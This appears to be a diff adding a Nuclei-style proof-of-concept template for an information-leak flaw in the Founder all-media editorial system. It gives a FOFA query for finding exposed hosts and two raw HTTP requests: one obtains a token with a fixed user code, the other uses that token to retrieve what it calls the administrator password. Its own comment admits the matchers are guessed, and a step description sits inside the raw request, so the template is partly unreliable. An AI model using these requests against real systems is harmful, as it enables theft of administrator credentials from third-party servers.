@@ -1,0 +1,31 @@
+id: poc-uzgr2iuo02bzrwag
+info:
+  name: 北大方正全媒体采编系统信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uzgr2iuo02bzrwag
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uzgr2iuo02bzrwag
+    fofa: app="FOUNDER-全媒体采编系统"
+http:
+- raw:
+  - 'GET /newsedit/tokenHelp/getToken.do?userCode=a18f178d935d2284a771f6f5903d7160 HTTP/1.1
+
+
+    2.使用上一步获取的token获取管理员密码'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - GET /newsedit/tokenHelp/getUserInfo.do?token=这里填步骤一获取到的token HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
